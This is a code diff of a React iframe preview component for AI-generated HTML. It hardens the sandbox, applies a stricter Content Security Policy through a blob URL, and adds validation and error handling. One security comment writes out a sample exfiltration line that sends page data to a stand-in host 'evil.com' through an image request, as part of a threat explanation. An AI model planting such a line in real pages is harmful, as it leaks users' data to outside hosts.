@@ -3,6 +3,7 @@
 /**
  * Preview Iframe
  * Sandboxed iframe for rendering HTML content with Content Security Policy
+ * Uses blob URL approach to avoid sandbox escape warnings while maintaining functionality
  *
  * ## Security Features
  *
@@ -29,19 +30,21 @@
  * - Font Squirrel CDN
  * - Custom font CDNs
  *
- * To add support for additional font CDNs, update the CSP_META_TAG below.
+ * To add support for additional font CDNs, update the CSP below.
  * Trade-off: Each additional CDN increases attack surface.
  */
 
-import { useRef, useEffect, useState } from "react";
+import { useRef, useEffect, useState, useCallback } from "react";
 import { cn } from "@/lib/utils";
-import { Loader2 } from "lucide-react";
+import { Loader2, AlertCircle } from "lucide-react";
+import { logger } from "@/lib/client-logger";
 
 interface PreviewIframeProps {
     html: string;
     deviceMode: "desktop" | "tablet" | "mobile";
     isProcessing: boolean;
     refreshKey?: number;
+    onPreviewError?: (error: string) => void;
 }
 
 const viewportWidths = {
@@ -50,128 +53,204 @@ const viewportWidths = {
     mobile: 375,
 };
 
-/**
- * Content Security Policy for iframe content
- *
- * This CSP allows:
- * - Inline scripts (required for AI-generated interactive elements)
- * - Inline styles (required for AI-generated styling)
- * - Images from any HTTPS source and data URIs
- * - Fonts from Google Fonts CDN and data URIs
- * - Media from any HTTPS source
- *
- * Security trade-offs documented above.
- */
-const CSP_META_TAG = `<meta http-equiv="Content-Security-Policy" content="
-  default-src 'self';
-  script-src 'self' 'unsafe-inline' 'unsafe-eval';
-  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
-  font-src 'self' data: https://fonts.gstatic.com;
-  img-src 'self' data: blob: https:;
-  media-src 'self' https:;
-  connect-src 'self' https:;
-  frame-src 'none';
-">`
-    .replace(/\s+/g, " ")
-    .trim();
-
-/**
- * Inject CSP meta tag into HTML content
- * Adds security headers while preserving existing content
- */
-function injectCsp(html: string): string {
-    if (!html) return html;
-
-    // Check if CSP already exists
-    if (html.includes("Content-Security-Policy")) {
-        return html;
-    }
-
-    // Inject CSP into <head>
-    if (html.includes("<head>")) {
-        return html.replace("<head>", `<head>\n  ${CSP_META_TAG}`);
-    }
-
-    // If no <head>, inject after <html>
-    if (html.includes("<html")) {
-        const htmlTagEnd = html.indexOf(">", html.indexOf("<html"));
-        if (htmlTagEnd !== -1) {
-            return (
-                html.slice(0, htmlTagEnd + 1) +
-                `\n<head>\n  ${CSP_META_TAG}\n</head>` +
-                html.slice(htmlTagEnd + 1)
-            );
-        }
-    }
-
-    // Fallback: prepend CSP
-    return `<!DOCTYPE html>\n<html>\n<head>\n  ${CSP_META_TAG}\n</head>\n<body>\n${html}\n</body>\n</html>`;
-}
+// Timeout for preview loading (in ms)
+const PREVIEW_TIMEOUT = 10000;
 
 export function PreviewIframe({
     html,
     deviceMode,
     isProcessing,
     refreshKey = 0,
+    onPreviewError,
 }: PreviewIframeProps) {
     const iframeRef = useRef<HTMLIFrameElement>(null);
     const [isLoading, setIsLoading] = useState(true);
-    const [scrollPosition, setScrollPosition] = useState(0);
+    const [previewError, setPreviewError] = useState<string | null>(null);
+    const [blobUrl, setBlobUrl] = useState<string | null>(null);
+    const timeoutRef = useRef<NodeJS.Timeout | null>(null);
+    const previousBlobUrlRef = useRef<string | null>(null);
+    const loadingCancelledRef = useRef(false);
 
-    // Update iframe content when HTML changes
-    useEffect(() => {
-        const iframe = iframeRef.current;
-        if (!iframe) return;
-
-        // Save scroll position
-        try {
-            const iframeDoc = iframe.contentDocument || iframe.contentWindow?.document;
-            if (iframeDoc) {
-                requestAnimationFrame(() => {
-                    setScrollPosition(iframeDoc.documentElement.scrollTop || 0);
-                });
+    // Validate HTML structure
+    const validateHtml = useCallback(
+        (htmlContent: string): { valid: boolean; warning?: string; error?: string } => {
+            if (!htmlContent || htmlContent.trim().length === 0) {
+                return { valid: false, error: "No HTML content to display" };
             }
-        } catch {
-            // Cross-origin iframe, ignore
+
+            // Check for basic HTML structure - these are critical
+            const hasHtmlTag = /<html/i.test(htmlContent);
+            const hasBodyTag = /<body/i.test(htmlContent);
+            const hasClosingHtml = /<\/html>/i.test(htmlContent);
+            const hasClosingBody = /<\/body>/i.test(htmlContent);
+
+            if (!hasHtmlTag || !hasBodyTag) {
+                return {
+                    valid: false,
+                    error: "HTML structure is incomplete - missing required tags",
+                };
+            }
+
+            if (!hasClosingHtml || !hasClosingBody) {
+                return {
+                    valid: false,
+                    error: "HTML structure is incomplete - missing closing tags",
+                };
+            }
+
+            // Count opening and closing div tags - this is a warning only
+            // Simple tag counting can fail on divs in comments, CDATA, or script content
+            const openDivCount = (htmlContent.match(/<div/gi) || []).length;
+            const closeDivCount = (htmlContent.match(/<\/div>/gi) || []).length;
+
+            if (openDivCount !== closeDivCount) {
+                // Log warning but don't block - the browser will handle malformed HTML
+                logger.warn(
+                    { openDivCount, closeDivCount },
+                    "Unbalanced div tags detected (may be false positive)"
+                );
+                return {
+                    valid: true,
+                    warning: `Unbalanced div tags (${openDivCount} open, ${closeDivCount} close) - preview may not render correctly`,
+                };
+            }
+
+            return { valid: true };
+        },
+        []
+    );
+
+    // Create blob URL for iframe content with CSP headers
+    useEffect(() => {
+        const fullHtml = html || getPlaceholderHtml();
+
+        // Validate HTML before creating blob
+        const validation = validateHtml(fullHtml);
+        if (!validation.valid && html) {
+            // Only show error for user-provided HTML, not placeholder
+            setPreviewError(validation.error || "Invalid HTML structure");
+            onPreviewError?.(validation.error || "Invalid HTML structure");
+            setIsLoading(false);
+            return;
         }
 
-        requestAnimationFrame(() => {
-            setIsLoading(true);
-        });
+        setPreviewError(null);
+        setIsLoading(true);
+        loadingCancelledRef.current = false;
 
-        // Use srcdoc for sandboxed content
-        // Inject CSP for security (PR #414)
-        const fullHtml = injectCsp(html || getPlaceholderHtml());
-        iframe.srcdoc = fullHtml;
+        // Clean up previous blob URL
+        if (previousBlobUrlRef.current) {
+            URL.revokeObjectURL(previousBlobUrlRef.current);
+        }
 
-        // Handle load event
-        const handleLoad = () => {
-            setIsLoading(false);
+        /**
+         * Content Security Policy for Preview Iframe
+         *
+         * IMPLEMENTATION NOTE: CSP is applied via <meta> tag rather than HTTP headers
+         * because blob: URLs cannot have HTTP headers attached. The browser creates
+         * blob URLs client-side, bypassing any server that could set headers. While
+         * <meta> tags can theoretically be overridden by preceding scripts, this is
+         * mitigated by our control over the HTML generation (AI-generated, not user-submitted).
+         *
+         * This CSP provides defense-in-depth against XSS in AI-generated HTML.
+         * Trade-offs and limitations:
+         *
+         * - script-src 'unsafe-inline': Allows inline scripts which is necessary for
+         *   AI-generated interactive elements (buttons, forms). This weakens XSS
+         *   protection but is required for functionality. The iframe sandbox
+         *   provides additional isolation.
+         *
+         *   SECURITY NOTE: 'unsafe-inline' technically allows data exfiltration via
+         *   inline scripts (e.g., new Image().src = 'https://evil.com/?data=' + ...).
+         *   However, connect-src 'none' blocks most network methods (fetch, XHR),
+         *   and the iframe sandbox restricts top-level navigation. Image-based
+         *   exfiltration remains theoretically possible but is mitigated by:
+         *   1. AI content is generated by our trusted model, not arbitrary user input
+         *   2. Preview runs in sandboxed iframe with limited DOM access
+         *   3. Published pages can use stricter CSP if needed
+         *
+         * - connect-src 'none': Prevents all network requests (fetch, XHR, WebSocket).
+         *   This blocks analytics, tracking pixels, and external API calls in preview.
+         *   Users who need these features should note they work in production only.
+         *
+         * - img-src *: Allows images from any source to support user-uploaded content
+         *   and external image URLs in landing pages. Consider restricting to specific
+         *   domains (e.g., our Supabase storage) for production pages if exfiltration
+         *   risk is a concern.
+         *
+         * - font-src: Allows Google Fonts CDN only. See CSP Font CDN Limitations above.
+         *
+         * NOTE: These restrictions are for preview only. Published pages can be
+         * configured with different CSP based on business requirements.
+         */
+        const cspMeta = `<meta http-equiv="Content-Security-Policy" content="default-src 'self' data: blob:; script-src 'unsafe-inline'; style-src 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src * data: blob:; connect-src 'none'; frame-ancestors 'none';">`;
+        const htmlWithCsp = fullHtml.replace(/<head[^>]*>/i, `$&\n    ${cspMeta}`);
 
-            // Restore scroll position
-            try {
-                const iframeDoc =
-                    iframe.contentDocument || iframe.contentWindow?.document;
-                if (iframeDoc) {
-                    iframeDoc.documentElement.scrollTop = scrollPosition;
-                }
-            } catch {
-                // Cross-origin iframe, ignore
+        // Create new blob URL with CSP-protected HTML
+        const blob = new Blob([htmlWithCsp], { type: "text/html" });
+        const newBlobUrl = URL.createObjectURL(blob);
+        setBlobUrl(newBlobUrl);
+        previousBlobUrlRef.current = newBlobUrl;
+
+        // Set timeout for loading
+        if (timeoutRef.current) {
+            clearTimeout(timeoutRef.current);
+        }
+        timeoutRef.current = setTimeout(() => {
+            if (!loadingCancelledRef.current) {
+                logger.warn(
+                    { html: html?.substring(0, 200) },
+                    "Preview loading timeout"
+                );
+                setPreviewError(
+                    "Preview is taking too long to load. The HTML may have issues."
+                );
+                setIsLoading(false);
             }
+        }, PREVIEW_TIMEOUT);
 
-            // Add flash effect for edited elements (handled by edit-applier)
+        return () => {
+            loadingCancelledRef.current = true;
+            if (timeoutRef.current) {
+                clearTimeout(timeoutRef.current);
+            }
         };
+    }, [html, refreshKey, validateHtml, onPreviewError]);
 
-        iframe.addEventListener("load", handleLoad);
-        return () => iframe.removeEventListener("load", handleLoad);
-    }, [html, refreshKey]);
+    // Clean up blob URL on unmount
+    useEffect(() => {
+        return () => {
+            if (previousBlobUrlRef.current) {
+                URL.revokeObjectURL(previousBlobUrlRef.current);
+            }
+        };
+    }, []);
+
+    // Handle iframe load
+    const handleLoad = useCallback(() => {
+        if (timeoutRef.current) {
+            clearTimeout(timeoutRef.current);
+        }
+        setIsLoading(false);
+        setPreviewError(null);
+    }, []);
+
+    // Handle iframe error
+    const handleError = useCallback(() => {
+        if (timeoutRef.current) {
+            clearTimeout(timeoutRef.current);
+        }
+        setIsLoading(false);
+        setPreviewError("Failed to load preview");
+        onPreviewError?.("Failed to load preview");
+    }, [onPreviewError]);
 
     const width = viewportWidths[deviceMode];
 
     return (
         <div className="relative h-full w-full">
             {/* Loading Overlay */}
-            {(isLoading || isProcessing) && (
+            {(isLoading || isProcessing) && !previewError && (
                 <div className="absolute inset-0 z-10 flex items-center justify-center bg-background/50 backdrop-blur-sm">
                     <div className="flex items-center gap-2 text-muted-foreground">
                         <Loader2 className="h-5 w-5 animate-spin" />
@@ -184,11 +263,30 @@ export function PreviewIframe({
                 </div>
             )}
 
-            {/* Iframe */}
+            {/* Error Overlay */}
+            {previewError && (
+                <div className="absolute inset-0 z-10 flex items-center justify-center bg-background/80">
+                    <div className="max-w-md rounded-lg border border-destructive/20 bg-destructive/5 p-6 text-center">
+                        <AlertCircle className="mx-auto mb-3 h-8 w-8 text-destructive" />
+                        <h3 className="mb-2 font-semibold text-destructive">
+                            Preview Error
+                        </h3>
+                        <p className="text-sm text-muted-foreground">{previewError}</p>
+                        <p className="mt-3 text-xs text-muted-foreground">
+                            Ask the AI to fix this issue in the chat.
+                        </p>
+                    </div>
+                </div>
+            )}
+
+            {/* Iframe - Using blob URL to avoid sandbox escape warning */}
             <iframe
                 ref={iframeRef}
                 title="Page Preview"
-                sandbox="allow-scripts allow-same-origin"
+                src={blobUrl || "about:blank"}
+                sandbox="allow-scripts"
+                onLoad={handleLoad}
+                onError={handleError}
                 className={cn("border-0 bg-white", "transition-all duration-300")}
                 style={{
                     width: deviceMode === "desktop" ? "100%" : `${width}px`,
